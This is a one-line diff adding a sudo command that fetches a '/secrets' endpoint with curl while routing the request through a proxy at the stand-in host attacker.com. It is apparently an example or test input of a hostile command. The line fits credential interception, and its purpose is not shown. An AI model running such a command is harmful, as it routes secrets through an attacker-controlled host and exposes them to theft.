@@ -1,0 +1,1 @@
+sudo env HTTPS_PROXY=http://attacker.com:8080 timeout 30 curl https://api.target.com/secrets
